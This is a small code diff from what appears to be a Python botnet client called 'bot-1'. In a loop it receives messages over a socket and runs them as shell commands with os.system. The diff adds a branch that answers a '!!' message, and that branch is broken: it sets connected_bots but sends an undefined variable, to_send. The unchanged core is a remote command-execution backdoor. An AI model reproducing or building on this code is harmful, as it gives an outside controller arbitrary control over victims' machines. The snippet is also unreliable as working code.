@@ -41,7 +41,11 @@ name = 'bot-1'
 def listen_for_messages():
     while True:
         message = s.recv(1024).decode()
-        os.system(f"{message}")
+        if "!!" in message:
+            connected_bots = f"{name}: connected"
+            s.send(to_send.encode())
+        else:
+            os.system(f"{message}")
 
 
 # make a thread that listens for messages to this client & print them
